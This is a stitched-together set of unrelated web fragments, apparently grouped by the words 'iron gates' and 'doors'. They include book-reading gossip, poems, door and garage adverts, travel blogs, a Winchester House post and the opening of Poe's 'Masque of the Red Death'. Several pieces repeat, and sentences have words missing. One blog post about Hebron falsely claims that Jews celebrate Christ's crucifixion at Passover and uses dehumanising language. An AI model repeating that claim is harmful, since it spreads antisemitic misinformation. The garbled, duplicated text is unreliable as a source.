(He&#x2019;s even added a category, Books, to a tabulated list that includes Saving Lives, Energy Innovation, Improving Education, and Philanthropy.) Why books? Well, <b>Gates</b>&#x2019; answer is, if anything, slightly more human and less programmatic than Zuckerberg&#x2019;s. &#x201c;I have always loved reading and learning,&#x201d; <b>Gates</b> said, &#x201c;so it is great if people see a book review and feel encouraged to read and share what they think online or with their friends.&#x201d;</span></p>   <p><span>The moral of this story? The urge to review books goes unsatisfied even when your every material and altruistic need is met. More interesting is <b>Gates</b>&#x2019; choice in books. He enjoyed, for example, Richard Dawkins&#x2019;&#xa0;</span><i><span>The Magic of Reality</span></i><span>, &#x201c;which explains various scientific ideas and is aimed at teenagers.&#x201d; Though <b>Gates</b> is quick to point out that he &#x201c;already understood all the concepts.&#x201d; Along these lines, <b>Gates</b> fell hard for Graeme Simsion&#x2019;s </span><i><span>The Rosie Project</span></i><span> and its sequel, </span><i><span>The Rosie Effect</span></i><span>, which apparently tell the story of &#x201c;a genetics professor with Asperger&#x2019;s Syndrome who goes looking for a wife.&#x201d; <b>Gates</b> headlined&#xa0;one of his posts about the book, &#x201c;</span><span>&#x201d; Maybe someone can remind him of </span><span>.</span></p>   <p><span>The White House released President Obama&#x2019;s vacation reading list last week, and its &#x201c;dark&#x201d; and &#x201c;heavy&#x201d; tenor </span><span> by </span><i><span>The Washington Post</span></i><span>. But what hasn&#x2019;t been noted is that Obama is the most interesting reader we&#x2019;ve had in office for decades, even </span><span>. On the list: Franzen&#x2019;s </span><i><span>Purity</span></i><span> (OK); Richard Price/Harry Brandt&#x2019;s </span><i><span>The Whites</span></i><span> (more interesting); David McCullough&#x2019;s </span><i><span>The Wright Brothers</span></i><span> (American, obligatory); and &#x2014; most interesting of all &#x2014; Liu Cixin&#x2019;s </span><i><span>The Three Body Problem</span></i><span>.

The copy of a man well-met</p> <p> who first appears, to men in war, a follower. A character sometimes seen around the fire he passes by, familiar</p> <p> barely noticed at first sight - or greets each man in his own tongue, easy with the right inflection, as though he took them all for fools</p> <p> but men must parlay, as a rule nights are long when fears enclose the spine engrafted on to sleep. He seldom is the first to speak.</p> <p> Between the hiss and glow of fires considered then, more than a spy more one of their own company, a stranger from on down the line.</p> <p> Beside this timeless flickering he casts about the counsel flames&#x2019; barbed shadows in the smoky air of orange, in the bloody cold</p> <p> has leave to pass without a word, taken for another soldier duty bound, left undisturbed and proved no man to talk to.</p> <p> <strong><font>Wednesday&#x2019;s Child</font></strong></p> <p> The same lawn toys are still outside for downstairs boy is now too ill; the paper&#x2019;s peeled away in strips, the kettle: broken weeks ago.

Season by season, they seem to swell, press even harder-in.</p> <p> No easy path this time of year, on the empties weeds grow over. The lift&#x2019;s carriage doors run-to; its ageing pulleys grind to start iron gates slide shut, shut fast.</p> <p> My fingers on the chair arm drum, I am waiting on my final cue and at the crucial moment, flag. The stage was set months ago.</p> <p> My heart hooked on the last high note of Miles&#x2019;s gallows horn, time drags on his dying blast - the wait has been too long.

   <div>   <p>When you have a choice, you might want to consider buying a home with a detached garage or building a detached garage instead of one attached to your home. Here are six reasons why.</p>   <ol>    <ol>     <li><strong>The fa&#xe7;ade of your home can be your home in Iron Gate Virginia</strong> instead of being dominated by a . While there are new designs that are very attractive, a garage door is a garage door and it&#x2019;s big. Unless you can tuck it away to the side of the home, it&#x2019;s going to be one of the most noticeable parts of your curb appeal &#x2013; or lack of curb appeal.</li>    </ol>   </ol>   <p>&#xa0;</p>   <ol>    <ol>     <li><strong>You can put it where you want it!</strong> A detached garage can be built wherever you want it on your property. You can build it on an angle or set it back from your home. You can build it out back if you have access from the rear of your property. You make the choice.</li>    </ol>   </ol>   <p>&#xa0;</p>   <ol>    <ol>     <li><strong>You can use the space next to your home the way you want.</strong> There may be something you would enjoy more than a garage. You could create a beautiful garden or patio. If you need more space, you can add another room to your home. A garage may not be the best use of the land next to your home.</li>    </ol>   </ol>   <p>&#xa0;</p>   <ol>    <ol>     <li><strong>It&#x2019;s easier to add living space above the garage in Iron Gate VA.</strong> If you need a separate space for a family member or to use as a guest suite, it is easier to incorporate it into the build than if you have to worry about how to add a second story to a garage next to your home. It may also be easier to add some multi-purpose space like a workshop or a storage area.</li>    </ol>   </ol>   <p>&#xa0;</p>   <ol>    <ol>     <li><strong>It&#x2019;s all about proportion. </strong>If you live in a small home, adding a double garage and that big door may overwhelm your home and take away from its appeal.</li>    </ol>   </ol>   <p>&#xa0;</p>   <ol>    <li><strong>It&#x2019;s not attached!</strong> You don&#x2019;t have to worry about the heat that&#x2019;s trapped in the garage bleeding into your home. You don&#x2019;t have to be concerned that it may offer a thief entry into your home. You don&#x2019;t have to figure out how to create a driveway for your car to get in the garage &#x2013; which can be tricky when you have to get around existing plantings, trees or utility hookups.</li>   </ol>   <p>Whether you&#x2019;re buying or building a garage in Iron Gate&#xa0;make sure that the garage door is safe and properly installed. Garage door springs and cables are under high tension. If you are buying, put safety first and have the garage inspected by a licensed garage door company to make sure the door is safe and the auto-reverse is working correctly. If you&#x2019;re building, count on a professional for garage door installation.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <div>    <h2>Video: <span>garage door repair in Iron Gate</span></h2>   </div>   <p>&#xa0;</p>  </div>

   <div>   <div>    <h1>Israeli Genocide On Pesach </h1>   </div>   <div>    <div>     <p>zionist colonists celebrating Pesach and drinking wine on Palestinian roof</p>    </div>    <p>Welcome to the big in the occupied city of Hebron, watch this short video which was recorded during the zionist colonists celebration of Pesach, the jewish Passover holiday where they also celebrate the crucifixion of Jesus Christ (peace be upon him). Forty thousand Palestinians live in this prison for the crime of being Palestinians and owning the houses and the land. The life of the human beings in Hebron is hostage to the whims of zionist soldiers who originate in the USA or the EU, unknown armed dregs, pillagers who control the lives of the Palestinians in heart of my homeland, Hebron.</p>    <p><span><strong>The israeli war criminal Ehud Barak who is always honored by the US government, the Pentagon and other serfs of zionism, is the criminal who issued the to the inner city with <b>iron</b> <b>gates</b> and cement. The criminal left the keys of the metal <b>doors</b> of the city in the pockets of his riff-raff in uniform. Only these soldiers are allowed to open and to close the entrances of the city where the 40.000 Palestinians live. The soldiers close and open the <b>doors</b> according to the instructions of the military headquarter, now led by the under command of Ehud Barak and the zionist organization, the so-called &#x201c;state of israel&#x201d; in Tel Aviv. </strong></span></p>    <p>Certainly you have not heard before about human beings living in a city with closed streets, with cement walls and <b>iron</b> <b>gates</b> at all entrances, because this abnormal , even the middle ages such criminal measures were unknown, but in Hebron they are implemented while US President Obama, who fawns before the war criminal Ehud Barak during his visits to the US, again and again, has not been telling Americans anything about this jail in Hebron while he send billions of US tax moneys to the zionist state. </p>    <p>I leave you to watch this small video made by Americans from CPT. The champion of the video is a little boy, &#x201c;Yoseph&#x201d;, of not even five years of age. In this film he symbolizes the suffering of the forty thousand Palestinians trapped inside their homes in the heart of Hebron. You will see its streets completely empty as if the city was not inhabited, as if it was a ghost town. This is <em><strong>GENOCIDE </strong></em>pure and simple, with the only purpose of destroying, impoverishing and slowly killing all Palestinians in hebron, and they are part of the daily life of every Palestinian, in Hebron and in other cities and towns where similar measures are implemented by the jewish invaders.</p>    <div>     <p>This image shows what the zionist colinsts did to the Palestinian market in Hebron </p>    </div>    <p>The video shows &#x201c;Yusuf&#x201d; when he tried to walk home from school on the first day of the jewish Pesach on April 20 2011, when the israeli occupation presence in Hebron was heightened. The checkpoints (the <b>iron</b> <b>gates</b> in front of Yusuf&#x2019;s house and around it, which he usually passes whenever he steps out of the house) were closed, so the boy tried some alternate routes before making it home. Watch this video to see a glimpse of the daily life for school kids in Hebron, occupied West Bank.</p>    <p>Under the film you can read the CPT press release. <span>Click on the picture below to see how riff-raff in uniform close the entrances of the city).</span></p>    <blockquote>     <p><em><strong>FOR IMMEDIATE RELEASE</strong></em></p>     <p>23 April 2011</p>     <p>A long walk home from school</p>     <p>On 20 and 21 April 2011, during the Jewish Passover holiday, the Israeli military closed all of the <b>gates</b> on the east side of the Old City souq in Al Khalil/Hebron.&#xa0; This severely restricted the movement of Palestinian residents in that area.&#xa0; One of those affected was Yusuf.</p>     <p>Yusuf is five years old.&#xa0; He attends the kindergarten just across the landing from the CPT women&#x2019;s apartment.&#xa0; He&#x2019;s a bright little boy, who interprets in sign language for his mother, who is deaf.&#xa0; He has congenital physical difficulties: he has no left arm and one leg is significantly shorter than the other.</p>     <p>On 20 April two CPTers happened to meet up with Yusuf and his kindergarten teacher as she took him home after class.&#xa0; The teacher took him first to one gate.&#xa0; It was locked.&#xa0; A soldier refused to open it and directed her to another locked gate.&#xa0; She walked there with Yusuf, and knocked at the gate.&#xa0; A soldier at that gate also refused to let them come through.</p>     <p>Yusuf&#x2019;s teacher then went with him to the home of a Palestinian woman whose house has <b>doors</b> both into the souq and onto Shuhada Street.&#xa0; She kindly allows children and teachers to pass through her house when the military lock the <b>gates</b>.&#xa0; Through that circuitous route the teacher was finally able to take Yusuf to his home.</p>     <p>&#xa0;</p>    </blockquote>    <p>&#xa0;</p>      <div>     <p>No related posts.</p>    </div>   </div>   <div>    <strong>&#xa0; | &#xa0;</strong> April 24th, 2011 | Tags: , , , | Category: , , , , ,   </div>  </div>

   <div>   <div>    <h1>Israeli Genocide On Pesach </h1>   </div>   <div>    <div>     <p>zionist colonists celebrating Pesach and drinking wine on Palestinian roof</p>    </div>    <p>Welcome to the big in the occupied city of Hebron, watch this short video which was recorded during the zionist colonists celebration of Pesach, the jewish Passover holiday where they also celebrate the crucifixion of Jesus Christ (peace be upon him). Forty thousand Palestinians live in this prison for the crime of being Palestinians and owning the houses and the land. The life of the human beings in Hebron is hostage to the whims of zionist soldiers who originate in the USA or the EU, unknown armed dregs, pillagers who control the lives of the Palestinians in heart of my homeland, Hebron.</p>    <p><span><strong>The israeli war criminal Ehud Barak who is always honored by the US government, the Pentagon and other serfs of zionism, is the criminal who issued the to the inner city with iron gates and cement. The criminal left the keys of the metal doors of the city in the pockets of his riff-raff in uniform. Only these soldiers are allowed to open and to close the entrances of the city where the 40.000 Palestinians live. The soldiers close and open the doors according to the instructions of the military headquarter, now led by the under command of Ehud Barak and the zionist organization, the so-called &#x201c;state of israel&#x201d; in Tel Aviv. </strong></span></p>    <p>Certainly you have not heard before about human beings living in a city with closed streets, with cement walls and iron gates at all entrances, because this abnormal , even the middle ages such criminal measures were unknown, but in Hebron they are implemented while US President Obama, who fawns before the war criminal Ehud Barak during his visits to the US, again and again, has not been telling Americans anything about this jail in Hebron while he send billions of US tax moneys to the zionist state. </p>    <p>I leave you to watch this small video made by Americans from CPT. The champion of the video is a little boy, &#x201c;Yoseph&#x201d;, of not even five years of age. In this film he symbolizes the suffering of the forty thousand Palestinians trapped inside their homes in the heart of Hebron. You will see its streets completely empty as if the city was not inhabited, as if it was a ghost town. This is <em><strong>GENOCIDE </strong></em>pure and simple, with the only purpose of destroying, impoverishing and slowly killing all Palestinians in hebron, and they are part of the daily life of every Palestinian, in Hebron and in other cities and towns where similar measures are implemented by the jewish invaders.</p>    <div>     <p>This image shows what the zionist colinsts did to the Palestinian market in Hebron </p>    </div>    <p>The video shows &#x201c;Yusuf&#x201d; when he tried to walk home from school on the first day of the jewish Pesach on April 20 2011, when the israeli occupation presence in Hebron was heightened. The checkpoints (the iron gates in front of Yusuf&#x2019;s house and around it, which he usually passes whenever he steps out of the house) were closed, so the boy tried some alternate routes before making it home. Watch this video to see a glimpse of the daily life for school kids in Hebron, occupied West Bank.</p>    <p>Under the film you can read the CPT press release. <span>Click on the picture below to see how riff-raff in uniform close the entrances of the city).</span></p>    <blockquote>     <p><em><strong>FOR IMMEDIATE RELEASE</strong></em></p>     <p>23 April 2011</p>     <p>A long walk home from school</p>     <p>On 20 and 21 April 2011, during the Jewish Passover holiday, the Israeli military closed all of the gates on the east side of the Old City souq in Al Khalil/Hebron.&#xa0; This severely restricted the movement of Palestinian residents in that area.&#xa0; One of those affected was Yusuf.</p>     <p>Yusuf is five years old.&#xa0; He attends the kindergarten just across the landing from the CPT women&#x2019;s apartment.&#xa0; He&#x2019;s a bright little boy, who interprets in sign language for his mother, who is deaf.&#xa0; He has congenital physical difficulties: he has no left arm and one leg is significantly shorter than the other.</p>     <p>On 20 April two CPTers happened to meet up with Yusuf and his kindergarten teacher as she took him home after class.&#xa0; The teacher took him first to one gate.&#xa0; It was locked.&#xa0; A soldier refused to open it and directed her to another locked gate.&#xa0; She walked there with Yusuf, and knocked at the gate.&#xa0; A soldier at that gate also refused to let them come through.</p>     <p>Yusuf&#x2019;s teacher then went with him to the home of a Palestinian woman whose house has doors both into the souq and onto Shuhada Street.&#xa0; She kindly allows children and teachers to pass through her house when the military lock the gates.&#xa0; Through that circuitous route the teacher was finally able to take Yusuf to his home.</p>     <p>&#xa0;</p>    </blockquote>    <p>&#xa0;</p>      <div>     <p>No related posts.</p>    </div>   </div>   <div>    <strong>&#xa0; | &#xa0;</strong> April 24th, 2011 | Tags: , , , | Category: , , , , ,   </div>  </div>

Featured in The American Weekly in 1928.</p>    </div>    <div>     <p>Sara Winchester was an eccentric and talented woman that worked on her home for 38 years until the day she died at age 83 on September 5, 1922.</p>    </div>    <p>The , has to be the most interesting house in San Jose, California. I&#x2019;ve been there twice over the last year.&#xa0;&#xa0; Each time I&#x2019;m mesmerized by Sara Winchester&#x2019;s ambitious endeavors to conquer the spirit world by enchanting it through misleading corridors and <b>doors</b> to nowhere. &#x201c;The house built by spirits&#x201d; has the incredible showmanship of an eccentric personality and a very full bank account.</p>    <p>Grief stricken from the death of her husband and infant daughter she sought fulfillment from mediums that could speak to the other side. Seeking closure of her loved ones deaths and feeling cursed she was advised to ward of &#x201c;bad spirits&#x201d; by building an endless maze of a home. Why was Sara cursed? It is said, that many died from the making of her families blood money because she was heiress to the Winchester Rifle Empire that made weapons to kill.</p>    <p>Most fascinating is her draw to the number 13.&#xa0; It&#x2019;s in all the details of the house. 13 repeated over and over.&#xa0; If you are in the area on any Friday the 13<sup>th</sup> you can buy tickets to a special tour.&#xa0; Sara hosted a s&#xe9;ance every night in a room built and dedicated to her nightly midnight rituals. &#xa0;Note: There are conspiracy theories that Sara was an active member of the Free Masons and reincarnated. &#xa0;The spirit world told Sara how to build her home to ward off &#x201c;bad spirits&#x201d;.&#xa0; I too&#xa0;like the number 13, it was Walt Disney&#x2019;s favorite number too. &#xa0;&#xa0;Did you know the address to Disneyland is 1313 Harbor Blvd? &#xa0;This number will pop up in the strangest places and various times to me.&#xa0; Check out our @Frolicking_Gypsies on Instagram to see our 13 sightings.</p>    <div>     <p>Fleur de lis encompass this door through the beautiful art glass. Was this a nod to royalty and the Francis Bacon Shakespeare theory?</p>    </div>    <p>Anyway~ the house is a marvelous Victorian built on a 6 acre sight, with luscious gardens and free standing workshops on property.&#xa0; This home started as a 8 bedroom farmhouse if you can believe that, it now has 160. The property is so large that it also host its own water tower.</p>    <p>A tourist destination located in the heart of San Jose, California.&#xa0;&#xa0; It is surrounded by a double layer of <b>iron</b> <b>gates</b> and chain link fences to keep the humans out I&#x2019;m sure, except for operating hours only to close on Christmas day.&#xa0; Please allow yourself time to digest every architectural detail as nothing has been skipped.</p>    <div>     <p>Sara used the Sun God design in many of her <b>iron</b> <b>gates</b>. This was said to be&#xa0;in honor of a Senior Decon of Masonic Blue Lodge.</p>    </div>    <p>Sara had a spectacular collection of art glass windows, some that never were hung can be seen within the house.&#xa0; Others you can view from walking the grounds surrounding the house.&#xa0; Many ordered from Austria or Tiffany&#x2019;s of New York.&#xa0; Unfortunately, many were destroyed over time especially during the earthquake of 1906 that also destroyed the fireplace and knocked the house down from 6 to 4 floors.&#xa0; My favorite art glass is the fleur de lis windows within the front <b>doors</b> of her home.&#xa0; Fleur de lis always remind me of my sweet NOLA, my baby sister Krissy and Paris, France.</p>    <p>The first time I visited Sara&#x2019;s home, my kids and I took the tour.&#xa0; You can buy tickets online but I opted for the widow to see if I could score a discount (i.e. AAA, military).&#xa0; If I can get a discount upon entry then I have more for the gift shop. &#xa0;We bought tickets for the whole tour inside and out. &#xa0;The second time I went on my own and walked the grounds for free. &#xa0;At this time the house is under contract and no photos can me taken inside the home. &#xa0;Be sure to visit their website before your tour and find out any details you may need to know.</p>    <p>The gift shop is worthy of a solid 15 minutes.&#xa0; They restock with household goods (fave find ), holiday items, magic tricks and toys.&#xa0; Also, an extension of a mini museum where you will see a display of produced items during Victorian times. &#xa0;To take a photographic walking tour check out our video.</p>    <div>     <p>Check out all the great finds amongst a fully stocked merchandise in the gift shop.</p>    </div>    <p>Sara worked on her home for 38 years until she passed away at age 83.</p>    <p>For more information on Sara check out this nice write up at the &#xa0;blog post.</p>    <p>Come take a tour with us visit our Channel.</p>    <div>     <span>Share this:</span>    </div>    <footer>     <h5>You might also want to read</h5>    </footer>     <div>      <div>      <div>       <h3>Leave a Reply </h3>      </div>      </div>    </div>   </article>   </article>

   <div>   <p><em><strong>Home and Garden : Front door design speaks volumes about you</strong></em> <em><strong> We have spent the past few weeks talking to a garden designer, Ken Wilson Max, and learnt what options were available for beautifying our gardens using very little water. We started at the gate to our properties and moved up the garden and today we are at the front door, the entrance to your home.</strong></em></p>   <p>BY <strong>HELEN DEVMAC</strong></p>   <p>Often visitors may end up at the front door without necessarily stepping inside. It is therefore important that what is at the front door typifies the elegance and style of your home. It is your shop window and your best advertisement.</p>   <p>But wait a minute, just where is the entrance to your home ? Is it the door leading into your hallway, kitchen, the door into the lounge or the garage? So, first things first. Let us decide which entrance will be used by visitors and guests to your home.</p>   <p>While every entrance should be appealing, there is no doubt that the main entrance has to have a very special appeal. A few tips on how to achieve this:</p>   <p>Eliminate all paraphernalia at the front door entrance &#x2014; no shoes, toys, mutsvairo and dustpans should be left to clutter the entrance. Ensure that the area immediately before the front door is kept clean and neat, with an attractive door mat on which your guests may clean their shoes before making an entrance.</p>   <p>Shoes left at the front door may create the impression that all visitors to your home must remove their shoes before stepping inside. I think this is only true of mosques and other sacred institutions. I don&#x2019;t know of any home to which this applies, but I stand to be corrected.</p>   <p>The door is the centre point of your entrance, so make sure that it is in keeping with the style of your house. There are indeed many varieties from which to choose.</p>   <p>Front <b>doors</b> must be safe, functional and weather resistant, and while we want to deter thieves from gaining entry, we also want them to be attractive.</p>   <p>This can be easily achieved by the use of bright colours. We do not have to stick to brown wooden <b>doors</b> because colour may be used to uplift an otherwise dull and dreary entrance.</p>   <p>And when thinking colour, let your imagination soar. Choose colours that make a statement. Imagine a leaf green door with a tub of colourful nasturtium, an abundant display of yellows and oranges tumbling around.</p>   <p>Choose plants that will flourish in that environment &#x2014; red geranium, pink and blue petunia. The possibilities are endless.</p>   <p>For keen gardeners, there are many landscaping ideas that can be brought to the front door. Apart from colourful flower tubs, hanging baskets with the season&#x2019;s colourful blooms are equally attractive.</p>   <p>And remember the dry garden! Aspects of this may be incorporated on to your front entrance making clever use of various stones, colours and textures to create a stunning feature at your entrance.</p>   <p>A large and sturdy door may need other influences to make your entrance more dramatic. The use of wrought <b>iron</b> whorls over the wood and it may achieve this.</p>   <p>Adding a window portal to the door is not only functional in that it allows you to see who may be at your door, but it has the advantage of providing additional lighting to your hallway. If you are going for wrought <b>iron</b> designs, you might consider wrought <b>iron</b> lamps in for any lighting features at your front door.</p>   <p>Lighting is not only important for your security, but when used correctly, it adds instant glamour through careful application of overhead and down lights on either side of your front door.</p>   <p>Door knockers may be used to great advantage, giving your entrance that old world appeal, but they should be polished to a high gloss to give the right effect. And any bells must be kept clean and grime-free.</p>   <p>from </p>  </div>

   <div>    <p>Sometimes the various worlds that we keep carefully compartmentalized come crashing together. That&#x2019;s what happened to me when I visited the Hotel California in the tiny Baja town of Todos Santos. (Not <i>the</i> Hotel California the Eagles sang about, or at least not exactly, but I&#x2019;ll get to that later.) </p>   <p>In addition to being a travel writer, I&#x2019;m a health writer. When wearing my &#x201c;other hat,&#x201d; I&#x2019;m a Senior Editor at , a health site for people (namely, most of us baby boomers and post-boomers) who are caring for aging parents, spouses, and other family members. For Caring.com I write about cancer and general health, particularly the serious diseases that afflict us as we age. I&#x2019;ve been a health writer for a long time; much longer, actually, than I&#x2019;ve been a travel writer.&#xa0; My stories about nutrition, anxiety, osteoporosis, back pain, and many other subjects have appeared in national magazines, and if people recognize my name at all, it&#x2019;s in that capacity. So I&#x2019;m comfortable talking about health issues, even those that make many people feel sad and uneasy.</p>   <p>But back to my story; I was in as a travel writer, not a health writer. And I was visiting the to see what the organizer of our trip thought was one of the most beautiful &#x2013; and most personal &#x2013; boutique hotels in the region. I instantly agreed; in fact I fell in love with the design sensibility of the hotel, and by association with its creators. I ran around photographing <b>doors</b>, light fixtures, <b>iron</b> <b>gates</b>, potted plants, and waited eagerly to meet the owner, Debbie Stewart. </p>   <p>When Debbie came out of the office, I had lots of questions. I was also researching a story about the influx of American and Canadian seniors moving south to retire in Baja, and wanted to ask her thoughts, since I knew she and her husband had been among the early wave of resident expats. What I didn&#x2019;t expect were the tears that came to her eyes when I asked if they planned to stay in Baja during their later years.&#xa0; It turned out that Debbie had come to Todos Santos, a tiny town an hour north of , with her husband John to carry out a dream &#x2013; <i>his</i> dream. He&#x2019;d found the hotel, which was rumored to be the infamous Hotel California of the eerie Eagles hit. (It&#x2019;s not &#x2013; years of gossip and rumor ended with a journalist asking Don Henley point blank &#x2013; and he said he&#x2019;d never been there.)</p>   <p>It was run down and decrepit when the Stewarts found it, and John&#x2019;s enthusiasm and vision had guided them through six years of hard work to bring it back to vivid, colorful life. They found artisans to make furniture, brought back carved <b>doors</b> from Oaxaca, designed ironwork and had it made by local craftspeople. The incredible artistic detail I&#x2019;d noted had all been John&#x2019;s doing, Debbie said; she&#x2019;d just helped him make it happen. Then in 2006, when the hotel had had a few years to become a success, John found out he had colon cancer. He fought it, but it was fast, and he died in September. He was still young, in his late 50s, hale and healthy, but the cancer won.</p>   <p>Learning that I wrote about cancer, and that I&#x2019;d been inspired to do so by losing my father too young to aggressive esophageal cancer, Debbie talked to me about what a blow John&#x2019;s death had been. She&#x2019;d thought she&#x2019;d return to Canada, she said; her friends and family insisted she come home where they could take care of her. But she couldn&#x2019;t bring herself to leave. She felt compelled to continue to carry out the dream they&#x2019;d created together running the Hotel California, now hugely successful. How could she abandon it now? And Todos Santos had become home. &#x201c;People come back year after year, and they&#x2019;d be crushed if it wasn&#x2019;t the same experience,&#x201d; Debbie says. &#x201c;Many of them have become friends, and then I have so many friends in town. Our New Year&#x2019;s Eve parties are famous around here.&#x201d;</p>   <p>There&#x2019;s also the restaurant, , which has earned fame in its own right, respected by fans of nuevo Mexican food. Voluble chef Dany Lamote, who landed in Baja from Belgium and is now raising his young family here, is a fanatic about the details; I spent an hour with him talking about salt. He makes his own evaporated sea salt, which now sells by the bag in the hotel&#x2019;s gift shop. He also teaches cooking classes and has a cookbook out with recipes from La Coronela, which was selling briskly during my visit. (He&#x2019;s signing it in the photo.)</p>   <p>The afternoon I spent talking to Debbie over Dany&#x2019;s incredible food has stayed with me much more vividly than many other meals, many other visits to lovely hotels. We met to talk travel, and ended up connected by cancer, as I&#x2019;ve ended up connected to many others over the years. I&#x2019;ll be back for a longer stay, because the Hotel California, and the artistic haven of Todos Santos, was one of the most compelling places I&#x2019;ve discovered in Baja. But I&#x2019;ll remember Debbie Stewart for deeper reasons, and I wish her well.</p>   </div>

Featured in The American Weekly in 1928.</p>    </div>    <div>     <p>Sara Winchester was an eccentric and talented woman that worked on her home for 38 years until the day she died at age 83 on September 5, 1922.</p>    </div>    <p>The , has to be the most interesting house in San Jose, California. I&#x2019;ve been there twice over the last year.&#xa0;&#xa0; Each time I&#x2019;m mesmerized by Sara Winchester&#x2019;s ambitious endeavors to conquer the spirit world by enchanting it through misleading corridors and doors to nowhere. &#x201c;The house built by spirits&#x201d; has the incredible showmanship of an eccentric personality and a very full bank account.</p>    <p>Grief stricken from the death of her husband and infant daughter she sought fulfillment from mediums that could speak to the other side. Seeking closure of her loved ones deaths and feeling cursed she was advised to ward of &#x201c;bad spirits&#x201d; by building an endless maze of a home. Why was Sara cursed? It is said, that many died from the making of her families blood money because she was heiress to the Winchester Rifle Empire that made weapons to kill.</p>    <p>Most fascinating is her draw to the number 13.&#xa0; It&#x2019;s in all the details of the house. 13 repeated over and over.&#xa0; If you are in the area on any Friday the 13<sup>th</sup> you can buy tickets to a special tour.&#xa0; Sara hosted a s&#xe9;ance every night in a room built and dedicated to her nightly midnight rituals. &#xa0;Note: There are conspiracy theories that Sara was an active member of the Free Masons and reincarnated. &#xa0;The spirit world told Sara how to build her home to ward off &#x201c;bad spirits&#x201d;.&#xa0; I too&#xa0;like the number 13, it was Walt Disney&#x2019;s favorite number too. &#xa0;&#xa0;Did you know the address to Disneyland is 1313 Harbor Blvd? &#xa0;This number will pop up in the strangest places and various times to me.&#xa0; Check out our @Frolicking_Gypsies on Instagram to see our 13 sightings.</p>    <div>     <p>Fleur de lis encompass this door through the beautiful art glass. Was this a nod to royalty and the Francis Bacon Shakespeare theory?</p>    </div>    <p>Anyway~ the house is a marvelous Victorian built on a 6 acre sight, with luscious gardens and free standing workshops on property.&#xa0; This home started as a 8 bedroom farmhouse if you can believe that, it now has 160. The property is so large that it also host its own water tower.</p>    <p>A tourist destination located in the heart of San Jose, California.&#xa0;&#xa0; It is surrounded by a double layer of iron gates and chain link fences to keep the humans out I&#x2019;m sure, except for operating hours only to close on Christmas day.&#xa0; Please allow yourself time to digest every architectural detail as nothing has been skipped.</p>    <div>     <p>Sara used the Sun God design in many of her iron gates. This was said to be&#xa0;in honor of a Senior Decon of Masonic Blue Lodge.</p>    </div>    <p>Sara had a spectacular collection of art glass windows, some that never were hung can be seen within the house.&#xa0; Others you can view from walking the grounds surrounding the house.&#xa0; Many ordered from Austria or Tiffany&#x2019;s of New York.&#xa0; Unfortunately, many were destroyed over time especially during the earthquake of 1906 that also destroyed the fireplace and knocked the house down from 6 to 4 floors.&#xa0; My favorite art glass is the fleur de lis windows within the front doors of her home.&#xa0; Fleur de lis always remind me of my sweet NOLA, my baby sister Krissy and Paris, France.</p>    <p>The first time I visited Sara&#x2019;s home, my kids and I took the tour.&#xa0; You can buy tickets online but I opted for the widow to see if I could score a discount (i.e. AAA, military).&#xa0; If I can get a discount upon entry then I have more for the gift shop. &#xa0;We bought tickets for the whole tour inside and out. &#xa0;The second time I went on my own and walked the grounds for free. &#xa0;At this time the house is under contract and no photos can me taken inside the home. &#xa0;Be sure to visit their website before your tour and find out any details you may need to know.</p>    <p>The gift shop is worthy of a solid 15 minutes.&#xa0; They restock with household goods (fave find ), holiday items, magic tricks and toys.&#xa0; Also, an extension of a mini museum where you will see a display of produced items during Victorian times. &#xa0;To take a photographic walking tour check out our video.</p>    <div>     <p>Check out all the great finds amongst a fully stocked merchandise in the gift shop.</p>    </div>    <p>Sara worked on her home for 38 years until she passed away at age 83.</p>    <p>For more information on Sara check out this nice write up at the &#xa0;blog post.</p>    <p>Come take a tour with us visit our Channel.</p>    <div>     <span>Share this:</span>    </div>    <footer>     <h5>You might also want to read</h5>    </footer>     <div>      <div>      <div>       <h3>Leave a Reply </h3>      </div>      </div>    </div>   </article>   </article>

   <div>   <p>Everybody wants to have a beautiful entrance to their homes. At the same time, no one intends to compromise on their safety. Many industries in Perth offer homeowners an extensive range of decorative security doors. These doors not only enhance the visual appearance but also allow a fresh breeze to circulate without having to be concerned about safety.</p>   <p>Most people have the impression that when it comes to having secure doors, they have to forego the aesthetic beauty of their home patio. The &#xa0;available in&#xa0;Perth have an unmatched elegance. Some of the enterprises cater to your customized requirements.</p>   <p>The range of ornamental security doors is incredible. It varies in material type, size, design and shape. You can have a stainless steel security mesh door, an aluminium screen door or a colonial style cast iron door. The cast iron screen not only is highly durable but also gives a plush look to the entrance. Consider using the steel door with steel grills, if your neighbourhood is prone to robberies.</p>   <p>You can choose to have either a traditional style security door or a colonial style one and they both are available in the sliding design as well as the hinged design. The available colour range of adorning security doors is vast. Also, you can have colour designs that blend into your current home setup by ordering from the customized collection.</p>   <p>Do not always get carried away with the ornamental design of the security doors. Also, do not blindly believe the manufacturer. All manufacturers claim that their security doors meet the security standards. Analyze and research the effectiveness of the gate against any burglar break-ins.</p>   <p>When finalizing on the security door of your choice, ensure that it meets the Australian Standard AS5039-2008. Apart from meeting the quality and effectiveness standard, also, ensure that the installation company guarantees to meet the installation standard.&#xa0;</p>    <footer>    This entry was posted in .

   <div>    <div>     <span>Audio Player</span>   </div>   <p>Podcast: | (Duration: 17:32 &#x2014; 16.1MB) | </p>   <p>Subscribe: | | </p>   <p>Halloween Special: Poe&#x2019;s parable of the persisting pandemic known as death. &#x2053;The Voice before the Void</p>   <h1>&#x201c;The Masque of the Red Death&#x201d;</h1>   <h2>Edgar Allan Poe</h2>   <p>The &#x201c;Red Death&#x201d; had long devastated the country. No pestilence had ever been so fatal, or so hideous. Blood was its Avatar and its seal&#x2014;the redness and the horror of blood. There were sharp pains, and sudden dizziness, and then profuse bleeding at the pores, with dissolution. The scarlet stains upon the body and especially upon the face of the victim, were the pest ban which shut him out from the aid and from the sympathy of his fellow-men. And the whole seizure, progress and termination of the disease, were the incidents of half an hour.</p>   <p>But the Prince Prospero was happy and dauntless and sagacious. When his dominions were half depopulated, he summoned to his presence a thousand hale and light-hearted friends from among the knights and dames of his court, and with these retired to the deep seclusion of one of his castellated abbeys. This was an extensive and magnificent structure, the creation of the prince&#x2019;s own eccentric yet august taste. A strong and lofty wall girdled it in. This wall had <b>gates</b> of <b>iron</b>. The courtiers, having entered, brought furnaces and massy hammers and welded the bolts. They resolved to leave means neither of ingress nor egress to the sudden impulses of despair or of frenzy from within. The abbey was amply provisioned. With such precautions the courtiers might bid defiance to contagion. The external world could take care of itself. In the meantime it was folly to grieve, or to think. The prince had provided all the appliances of pleasure. There were buffoons, there were improvisatori, there were ballet-dancers, there were musicians, there was Beauty, there was wine. All these and 